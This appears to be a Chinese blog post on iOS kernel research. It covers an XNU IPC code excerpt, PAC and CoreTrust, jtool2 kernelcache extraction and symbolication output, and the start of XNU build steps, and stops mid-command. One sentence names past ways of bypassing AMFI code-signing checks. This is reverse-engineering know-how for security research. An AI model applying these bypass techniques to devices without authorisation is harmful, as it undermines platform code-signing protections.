<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">    <span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">.....................</span></span><br><span class="line"><span class="params">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    data = kalloc(ports_length);</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span></span><br><span class="line"><span class="params">        *mr = MACH_SEND_NO_BUFFER;</span></span><br><span class="line"><span class="params">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span></span><br><span class="line"><span class="params">    &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="指针验证检查和CoreTrust"><a href="#指针验证检查和CoreTrust" class="headerlink" title="指针验证检查和CoreTrust"></a>指针验证检查和CoreTrust</h3><p>ARM 8.3指令集添加了一个称为PAC(Pointer Authentication Check，指针验证检查)的新功能，目的是检查指针的完整性。它将加密签名附加到指针值里未使用的位中，然后在使用指针之前验证这些签名。由于攻击者没有用于为这些指针创建签名的密钥，因此无法创建有效的指针。<br>另一方面，CoreTrust是一个单独的内核扩展(com.apple.kext.CoreTrust)，它不允许自签名二进制文件(jtool2 -sign)在设备上运行。以前，Apple Mobile File Integrity Kext(AMFI.kext)与用户态amfid守护程序一起检查代码签名。可以通过将代码签名哈希注入AMFI trust cache，hook amfid异常端口并允许代码继续执行等多种方式来绕过。CoreTrust施加了一些其他检查，这些检查仅允许Apple签名的二进制文件在设备上运行。</p>
<h2 id="KernelCache"><a href="#KernelCache" class="headerlink" title="KernelCache"></a>KernelCache</h2><p>KernelCache是一个包含核心内核及其内核拓展的Mach-O二进制文件，iOS10之前是加密的，现在可以通过IPSW文件解压得到，或者通过内核漏洞dump出来。</p>
<h3 id="提取kext文件"><a href="#提取kext文件" class="headerlink" title="提取kext文件"></a>提取kext文件</h3><p>通过jtool2获取kext的地址信息，再在IDA中进行分析。或者也可以将kernelcache解码后，放在Ghidra中进行分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 -k kernelcache.release.n66</span><br><span class="line">0xfffffff005c5c000:com.apple.kpi.mach</span><br><span class="line">0xfffffff005c5c080:com.apple.kpi.private</span><br><span class="line">0xfffffff005c5c100:com.apple.kpi.unsupported</span><br><span class="line">0xfffffff005c5c180:com.apple.kpi.iokit</span><br><span class="line">0xfffffff005c5c200:com.apple.kpi.libkern</span><br><span class="line">0xfffffff005c5c280:com.apple.kpi.bsd</span><br><span class="line">0xfffffff005c5c300:com.apple.iokit.IONetworkingFamily</span><br><span class="line">0xfffffff005c5de00:com.apple.iokit.IOTimeSyncFamily</span><br><span class="line">0xfffffff005c616c0:com.apple.driver.corecapture</span><br><span class="line">0xfffffff005c64bc0:com.apple.kec.corecrypto</span><br><span class="line">0xfffffff005c7cf00:com.apple.driver.IOImageLoader</span><br><span class="line">0xfffffff005c7f080:com.apple.driver.AppleBCMWLANFirmware.Hashstore</span><br><span class="line">0xfffffff005c8de00:com.apple.iokit.IOSlowAdaptiveClockingFamily</span><br><span class="line">0xfffffff005c8e380:com.apple.iokit.IOStorageFamily</span><br><span class="line">0xfffffff005c8f5c0:com.apple.iokit.IOReportFamily</span><br><span class="line">0xfffffff005c8fdc0:com.apple.driver.AppleARMPlatform</span><br><span class="line">0xfffffff005c99600:com.apple.driver.AppleSamsungSPI</span><br><span class="line">0xfffffff005c9a580:com.apple.kpi.dsep</span><br><span class="line">0xfffffff005c9a600:com.apple.kext.CoreTrust</span><br><span class="line">0xfffffff005c9b3c0:com.apple.driver.AppleMobileFileIntegrity</span><br><span class="line">0xfffffff005cc23c0:com.apple.iokit.IOHIDFamily</span><br><span class="line">0xfffffff005cc3f40:com.apple.driver.AppleEmbeddedLightSensor</span><br><span class="line">0xfffffff005cc7980:com.apple.driver.AppleS5L8920XPWM</span><br><span class="line">0xfffffff005cc7f00:com.apple.driver.AppleEmbeddedTempSensor</span><br><span class="line">0xfffffff005ccb7c0:com.apple.driver.usb.AppleUSBCommon</span><br><span class="line">0xfffffff005ccc200:com.apple.driver.AppleUSBHostMergeProperties</span><br><span class="line">0xfffffff005ccc7c0:com.apple.iokit.IOUSBDeviceFamily</span><br><span class="line">0xfffffff005cd0d40:com.apple.iokit.IOSerialFamily</span><br><span class="line">0xfffffff005cd1680:com.apple.iokit.IOSkywalkFamily</span><br><span class="line">0xfffffff005cd2f80:com.apple.driver.AppleOnboardSerial</span><br><span class="line">0xfffffff005cd4e40:com.apple.iokit.IOAccessoryManager</span><br><span class="line">0xfffffff005cda180:com.apple.driver.AppleARMPMU</span><br><span class="line">0xfffffff005cdcfc0:com.apple.driver.AppleSN2400Charger</span><br><span class="line">0xfffffff005cddf80:com.apple.iokit.IOSurface</span><br><span class="line">0xfffffff005ce3b00:com.apple.driver.IODARTFamily</span><br><span class="line">0xfffffff005ce5cc0:com.apple.driver.AppleM2ScalerCSCDriver</span><br><span class="line">0xfffffff005d14e80:com.apple.iokit.IOHDCPFamily</span><br><span class="line">0xfffffff005d1a100:com.apple.kec.Libm</span><br><span class="line">0xfffffff005d205c0:com.apple.iokit.IOAudio2Family</span><br><span class="line">0xfffffff005d20e40:com.apple.iokit.IOCECFamily</span><br><span class="line">0xfffffff005d217c0:com.apple.iokit.IOAVFamily</span><br><span class="line">0xfffffff005d38280:com.apple.AUC</span><br><span class="line">0xfffffff005d39900:com.apple.iokit.IOMobileGraphicsFamily</span><br><span class="line">0xfffffff005d400c0:com.apple.driver.AppleH8ADBE0</span><br><span class="line">0xfffffff005d51dc0:com.apple.driver.AppleAVEH8</span><br><span class="line">0xfffffff005dcf640:com.apple.driver.AppleFirmwareUpdateKext</span><br><span class="line">0xfffffff005dd2400:com.apple.driver.ApplePMGR</span><br><span class="line">0xfffffff005de4740:com.apple.driver.AppleS8000PMGR</span><br><span class="line">0xfffffff005de6380:com.apple.driver.AppleIPAppender</span><br><span class="line">0xfffffff005de6ec0:com.apple.driver.AppleMultitouchSPI</span><br><span class="line">0xfffffff005deb580:com.apple.iokit.IOPCIFamily</span><br><span class="line">0xfffffff005ded9c0:com.apple.driver.AppleEmbeddedPCIE</span><br><span class="line">0xfffffff005df3e80:com.apple.driver.AppleS800xPCIe</span><br><span class="line">0xfffffff005df6500:com.apple.driver.AppleS8000PCIe</span><br><span class="line">0xfffffff005df7280:com.apple.driver.AppleBiometricSensor</span><br><span class="line">0xfffffff005dfd8c0:com.apple.driver.ProvInfoIOKit</span><br><span class="line">0xfffffff005e01b40:com.apple.iokit.IOUSBHostFamily</span><br><span class="line">0xfffffff005e12800:com.apple.driver.usb.AppleUSBHostPacketFilter</span><br><span class="line">0xfffffff005e130c0:com.apple.driver.AppleS5L8960XDART</span><br><span class="line">0xfffffff005e14840:com.apple.driver.DiskImages</span><br><span class="line">0xfffffff005e15600:com.apple.driver.DiskImages.KernelBacked</span><br><span class="line">0xfffffff005e15dc0:com.apple.driver.DiskImages.RAMBackingStore</span><br><span class="line">0xfffffff005e16380:com.apple.driver.AppleJPEGDriver</span><br><span class="line">0xfffffff005e1bec0:com.apple.iokit.AppleARMIISAudio</span><br><span class="line">0xfffffff005e1ce40:com.apple.driver.AppleEmbeddedAudio</span><br><span class="line">0xfffffff005e239c0:com.apple.driver.AppleCSEmbeddedAudio</span><br><span class="line">0xfffffff005e24600:com.apple.iokit.IOMikeyBusFamily</span><br><span class="line">0xfffffff005e26780:com.apple.driver.AppleTriStar</span><br><span class="line">0xfffffff005e28d40:com.apple.driver.AppleEmbeddedMikeyBus</span><br><span class="line">0xfffffff005e2ae40:com.apple.driver.AppleMikeyBusAudio</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleHIDKeyboardEmbedded</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleS5L8940XI2C</span><br><span class="line">0xfffffff005e2ec80:com.apple.driver.AppleEmbeddedUSB</span><br><span class="line">0xfffffff005e30440:com.apple.iokit.IOCryptoAcceleratorFamily</span><br><span class="line">0xfffffff005e31300:com.apple.iokit.EncryptedBlockStorage</span><br><span class="line">0xfffffff005e31ac0:com.apple.driver.AppleEffaceableStorage</span><br><span class="line">0xfffffff005e33580:com.apple.driver.LightweightVolumeManager</span><br><span class="line">0xfffffff005e36040:com.apple.driver.usb.networking</span><br><span class="line">0xfffffff005e36680:com.apple.driver.usb.AppleUSBHostCompositeDevice</span><br><span class="line">0xfffffff005e37240:com.apple.driver.usb.cdc</span><br><span class="line">0xfffffff005e37900:com.apple.driver.usb.cdc.ncm</span><br><span class="line">0xfffffff005e38900:com.apple.driver.AppleUSBEthernetDevice</span><br><span class="line">0xfffffff005e39a80:com.apple.iokit.IO80211Family</span><br><span class="line">0xfffffff005e61ac0:com.apple.plugin.IOgPTPPlugin</span><br><span class="line">0xfffffff005e76f00:com.apple.driver.LSKDIOKit</span><br><span class="line">0xfffffff005e95200:com.apple.driver.FairPlayIOKit</span><br><span class="line">0xfffffff005eabe40:com.apple.driver.LSKDIOKitMSE</span><br><span class="line">0xfffffff005ec0cc0:com.apple.driver.AppleD5500</span><br><span class="line">0xfffffff005eea380:com.apple.driver.IOSlaveProcessor</span><br><span class="line">0xfffffff005eea900:com.apple.driver.AppleA7IOP</span><br><span class="line">0xfffffff005eeed80:com.apple.driver.RTBuddy</span><br><span class="line">0xfffffff005efb840:com.apple.driver.AppleSMC</span><br><span class="line">0xfffffff005f01900:com.apple.driver.AppleSEPManager</span><br><span class="line">0xfffffff005f1aa80:com.apple.driver.AppleSSE</span><br><span class="line">0xfffffff005f1ba80:com.apple.driver.ASIOKit</span><br><span class="line">0xfffffff005f1d0c0:com.apple.driver.AppleS8000DWI</span><br><span class="line">0xfffffff005f1d880:com.apple.driver.AppleCS35L19Amp</span><br><span class="line">0xfffffff005f1e200:com.apple.driver.usb.IOUSBHostHIDDevice</span><br><span class="line">0xfffffff005f1fd80:com.apple.driver.AppleUSBDeviceAudioController</span><br><span class="line">0xfffffff005f20580:com.apple.driver.AppleUSBAudio</span><br><span class="line">0xfffffff005f22e40:com.apple.driver.DiskImages.UDIFDiskImage</span><br><span class="line">0xfffffff005f24080:com.apple.driver.AppleLMBacklight</span><br><span class="line">0xfffffff005f249c0:com.apple.iokit.IOUserEthernet</span><br><span class="line">0xfffffff005f25300:com.apple.iokit.IOSCSIArchitectureModelFamily</span><br><span class="line">0xfffffff005f26940:com.apple.iokit.IOSCSIBlockCommandsDevice</span><br><span class="line">0xfffffff005f27240:com.apple.iokit.IOUSBMassStorageDriver</span><br><span class="line">0xfffffff005f29bc0:com.apple.driver.AppleUSBCardReader</span><br><span class="line">0xfffffff005f2aec0:com.apple.driver.AppleS8000SOCTuner</span><br><span class="line">0xfffffff005f2bb00:com.apple.driver.AppleSynopsysMIPIDSI</span><br><span class="line">0xfffffff005f2f580:com.apple.nke.ppp</span><br><span class="line">0xfffffff005f31980:com.apple.nke.l2tp</span><br><span class="line">0xfffffff005f33880:com.apple.driver.AppleSynopsysOTGDevice</span><br><span class="line">0xfffffff005f36100:com.apple.driver.AppleSPU</span><br><span class="line">0xfffffff005f39780:com.apple.AGXFirmwareKextG5P</span><br><span class="line">0xfffffff005f57740:com.apple.driver.AppleS8000PMPFirmware</span><br><span class="line">0xfffffff005f58300:com.apple.driver.AppleTwisterErrorHandler</span><br><span class="line">0xfffffff005f59240:com.apple.driver.AppleS8000</span><br><span class="line">0xfffffff005f5d840:com.apple.IOTextEncryptionFamily</span><br><span class="line">0xfffffff005f5e180:com.apple.driver.usb.AppleUSBHub</span><br><span class="line">0xfffffff005f63440:com.apple.driver.AppleH6CameraInterface</span><br><span class="line">0xfffffff005f6a380:com.apple.driver.AppleMobileApNonce</span><br><span class="line">0xfffffff005f6b280:com.apple.driver.AppleUSBMike</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleMultitouchSPIN66</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleS8000CLPC</span><br><span class="line">0xfffffff005f72e40:com.apple.driver.AppleSEPKeyStore</span><br><span class="line">0xfffffff005f75240:com.apple.audio.IOBorealisOwl</span><br><span class="line">0xfffffff005f7f880:com.apple.driver.DiskImages.FileBackingStore</span><br><span class="line">0xfffffff005f7ffc0:com.apple.driver.ApplePMP</span><br><span class="line">0xfffffff005f82dc0:com.apple.iokit.IOStreamFamily</span><br><span class="line">0xfffffff005f83580:com.apple.driver.AppleS5L8960XNCO</span><br><span class="line">0xfffffff005f83b00:com.apple.driver.AppleChestnutDisplayPMU</span><br><span class="line">0xfffffff005f84340:com.apple.kec.pthread</span><br><span class="line">0xfffffff005f86640:com.apple.driver.AppleStockholmControl</span><br><span class="line">0xfffffff005f87040:com.apple.driver.AppleSamsungSerial</span><br><span class="line">0xfffffff005f87700:com.apple.driver.AppleBSDKextStarter</span><br><span class="line">0xfffffff005f87cc0:com.apple.driver.usb.cdc.ecm</span><br><span class="line">0xfffffff005f88440:com.apple.driver.AppleBasebandN71</span><br><span class="line">0xfffffff005f8a200:com.apple.filesystems.apfs</span><br><span class="line">0xfffffff005fb0e80:com.apple.kext.AppleMatch</span><br><span class="line">0xfffffff005fb1200:com.apple.driver.AppleEffaceableBlockDevice</span><br><span class="line">0xfffffff005fb19c0:com.apple.driver.AppleS8000AES</span><br><span class="line">0xfffffff005fb3b00:com.apple.driver.AppleMesaSEPDriver</span><br><span class="line">0xfffffff005fba440:com.apple.driver.AppleBluetooth</span><br><span class="line">0xfffffff005fbabc0:com.apple.driver.usb.ethernet.asix</span><br><span class="line">0xfffffff005fbc200:com.apple.driver.AppleBasebandPCI</span><br><span class="line">0xfffffff005fc2a00:com.apple.driver.AppleSEPCredentialManager</span><br><span class="line">0xfffffff005fc7140:com.apple.driver.AppleS8003PCIe</span><br><span class="line">0xfffffff005fc7f00:com.apple.driver.AppleSamsungPKE</span><br><span class="line">0xfffffff005fc84c0:com.apple.driver.AppleInterruptController</span><br><span class="line">0xfffffff005fc9380:com.apple.driver.AppleC26Charger</span><br><span class="line">0xfffffff005fca7c0:com.apple.driver.AppleAuthCP</span><br><span class="line">0xfffffff005fcc440:com.apple.driver.AppleSPUSphere</span><br><span class="line">0xfffffff005fccb80:com.apple.driver.AppleS5L8960XGPIOIC</span><br><span class="line">0xfffffff005fcd9c0:com.apple.security.sandbox</span><br><span class="line">0xfffffff0060520c0:com.apple.driver.AppleHIDKeyboard</span><br><span class="line">0xfffffff006053200:com.apple.driver.AppleHDQGasGaugeControl</span><br><span class="line">0xfffffff006055e00:com.apple.driver.AppleTemperatureSensor</span><br><span class="line">0xfffffff006056b40:com.apple.driver.AppleAE2Audio</span><br><span class="line">0xfffffff006057e00:com.apple.driver.AppleNANDConfigAccess</span><br><span class="line">0xfffffff006058340:com.apple.iokit.IONVMeFamily</span><br><span class="line">0xfffffff006065000:com.apple.driver.AppleDialogPMU</span><br><span class="line">0xfffffff0060658c0:com.apple.driver.AppleD2255PMU</span><br><span class="line">0xfffffff006067540:com.apple.iokit.IOHIDEventDriver</span><br><span class="line">0xfffffff006067540:com.apple.driver.USBStorageDeviceSpecifics</span><br><span class="line">0xfffffff006067540:com.apple.driver.usb.AppleUSBEHCI</span><br><span class="line">0xfffffff006070cc0:com.apple.driver.AppleUSBHSIC</span><br><span class="line">0xfffffff006072d40:com.apple.driver.usb.AppleUSBOHCI</span><br><span class="line">0xfffffff006075b80:com.apple.driver.AppleEmbeddedUSBHost</span><br><span class="line">0xfffffff006076b00:com.apple.driver.usb.AppleUSBHostT7000</span><br><span class="line">0xfffffff006078600:com.apple.driver.IOAudioCodecs</span><br><span class="line">0xfffffff00607b4c0:com.apple.driver.DiskImages.ReadWriteDiskImage</span><br><span class="line">0xfffffff00607ba00:com.apple.AppleFSCompression.AppleFSCompressionTypeZlib</span><br><span class="line">0xfffffff00607d180:com.apple.driver.AppleBluetoothDebugService</span><br><span class="line">0xfffffff00607d6c0:com.apple.driver.AppleBCMWLANCore</span><br><span class="line">0xfffffff0060b97c0:com.apple.driver.AppleBCMWLANBusInterfacePCIe</span><br><span class="line">0xfffffff0060c9180:com.apple.driver.AppleUSBDeviceNCM</span><br><span class="line">0xfffffff0060c9d80:com.apple.security.AppleImage4</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleBSDKextStarterVPN</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleCS42L71Audio</span><br><span class="line">0xfffffff0060cfb00:com.apple.filesystems.hfs.kext</span><br><span class="line">0xfffffff0060e33c0:com.apple.driver.AppleS8000SmartIO</span><br><span class="line">0xfffffff0060ec940:com.apple.driver.AppleM68Buttons</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.usb.IOUSBHostHIDDeviceSafeBoot</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.AppleUSBDeviceMux</span><br><span class="line">0xfffffff0060ef740:com.apple.nke.pptp</span><br><span class="line">0xfffffff0060f0ac0:com.apple.driver.AppleBasebandPCIMAVControl</span><br><span class="line">0xfffffff0060f58c0:com.apple.driver.AppleS5L8960XWatchDogTimer</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.AppleStorageDrivers</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.ApplePinotLCD</span><br><span class="line">0xfffffff0060f6ac0:com.apple.iokit.IOAcceleratorFamily</span><br><span class="line">0xfffffff0060fc080:com.apple.iokit.usb.AppleUSBHostUserClient</span><br><span class="line">0xfffffff0060fc080:com.apple.driver.AppleUSBEthernetHost</span><br><span class="line">0xfffffff0060fd200:com.apple.driver.AppleIDAMInterface</span><br><span class="line">0xfffffff0060fdd80:com.apple.iokit.IOHIDEventDriverSafeBoot</span><br><span class="line">0xfffffff0060fdd80:com.apple.driver.AppleBasebandPCIMAVPDP</span><br><span class="line">0xfffffff0060fea00:com.apple.driver.AppleDiagnosticDataAccessReadOnly</span><br><span class="line">0xfffffff0060ff180:com.apple.iokit.IOAcceleratorFamily2</span><br><span class="line">0xfffffff006108f40:com.apple.AGXG5P</span><br><span class="line">0xfffffff006119b40:com.apple.driver.AppleBiometricServices</span><br><span class="line">0xfffffff00611a7c0:com.apple.driver.AppleS5L8960XUSB</span><br></pre></td></tr></table></figure>

<p>据说在越狱设备的<code>/System/Library/Caches/com.apple.kernelcaches/</code>目录下可以找到解压的kernelcache，但是我没找到。	</p>
<p>Kernelcache符号，iOS12之后是不带kernelcache符号的，但是Apple误发了一个带有符号的beta版本，通过jtool2的analyze选项，可以分析kernelcache的符号并保存到文件中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 --analyze kernelcache.release.iphone7</span><br><span class="line">Loaded 268/45/3/0  matchers</span><br><span class="line">Analyzing kernelcache..</span><br><span class="line">This is a new-style A8 kernelcache (Darwin Kernel Version 18.2.0: Tue Oct 16 21:02:34 PDT 2018; root:xnu-4903.222.5~1/RELEASE_ARM64_T7000)</span><br><span class="line">-- Processing __TEXT_EXEC.__text..</span><br><span class="line">Disassembling 19389120 bytes from address 0xfffffff007680000 (offset 0x67c000):</span><br><span class="line">__ZN11OSMetaClassC2EPKcPKS_j is 0xfffffff007cb84bc (OSMetaClass)</span><br><span class="line">Analyzing __DATA.__data..</span><br><span class="line">Got _localnode_id @0xfffffff008918640</span><br><span class="line">Analyzing __DATA.__sysctl_set..</span><br><span class="line">Analyzing fuctions...</span><br><span class="line">Can<span class="string">&#x27;t get realhost :-(</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (1st pass)</span></span><br><span class="line"><span class="string">LAST ARG0 : fffffff00762f420 , fffffff00717a750, 0</span></span><br><span class="line"><span class="string">processing flows...</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (2nd pass)</span></span><br><span class="line"><span class="string">GOT PTHREAD SHIMS! (0xfffffff0074abbf0)</span></span><br><span class="line"><span class="string">Got 1708 IOKit Classes</span></span><br><span class="line"><span class="string">opened companion file ./kernelcache.release.iphone7.ARM64.9DBCEF3B-873D-358D-B74B-CC7DDDC7546B</span></span><br><span class="line"><span class="string">Dumping symbol cache to file</span></span><br><span class="line"><span class="string">Symbolicated 7318 symbols and 62941 functions</span></span><br></pre></td></tr></table></figure>

<h2 id="XNU编译"><a href="#XNU编译" class="headerlink" title="XNU编译"></a>XNU编译</h2><p>先看一下源码结构：</p>
<ul>
<li><code>config</code>- 为支持的架构和平台配置导出的 api。</li>
<li><code>SETUP</code>- 用于配置内核、版本控制和 kextsymbol 管理的基本工具集。</li>
<li><code>EXTERNAL_HEADERS</code>- 来自其他项目的头文件，以避免构建时的重复依赖。这些头文件应在源更新时定期同步。</li>
<li><code>libkern</code>- 用于处理驱动程序和 kexts 的 C++ IOKit 库代码。</li>
<li><code>libsa</code>- 用于启动的内核引导代码。</li>
<li><code>libsyscall</code>- 用户空间程序的系统调用库接口。</li>
<li><code>libkdd</code>- 用于解析内核数据（如内核分块数据）的用户库的源代码。</li>
<li><code>makedefs</code>- 内核构建的顶级规则和定义。</li>
<li><code>osfmk</code>- 基于 Mach 内核的子系统。</li>
<li><code>pexpert</code>- 平台特定代码，如中断处理、原子等。</li>
<li><code>security</code>- 强制访问检查策略接口和相关实现。</li>
<li><code>bsd</code>- BSD子系统代码。</li>
<li><code>tools</code>- 一组用于测试、调试和分析内核的实用程序。</li>
</ul>
<h3 id="编译-未成功"><a href="#编译-未成功" class="headerlink" title="编译(未成功)"></a><em>编译(未成功)</em></h3><blockquote>
<p>可以使用<a target="_blank" rel="noopener" href="https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html">这里</a>的脚本进行编译，亲测有效。</p>
</blockquote>
<p>先根据XNU源码版本，确定在<a target="_blank" rel="noopener" href="https://opensource.apple.com/releases/">开源代码</a>中的位置，以下以<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>为例进行说明。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TARBALLS=https://opensource.apple.com/tarballs</span><br><span class="line"><span class="comment"># 下载需要用到源码，对应XNU的版本</span></span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/dtrace/dtrace-284.200.15.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/AvailabilityVersions/AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/libdispatch/libdispatch-1008.220.2.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="编译dtrace"><a href="#编译dtrace" class="headerlink" title="编译dtrace"></a>编译dtrace</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xf dtrace-284.200.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> dtrace-284.200.15.tar.gz</span><br><span class="line"></span><br><span class="line">xcodebuild install -sdk macosx -target ctfconvert \</span><br><span class="line">-target ctfdump -target ctfmerge \</span><br><span class="line">ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> VALID_ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TOOLCHAIN=`<span class="built_in">cd</span> $(xcrun -sdk macosx -show-sdk-platform-path)/../../Toolchains/XcodeDefault.xctoolchain &amp;&amp; <span class="built_in">pwd</span>`</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/<span 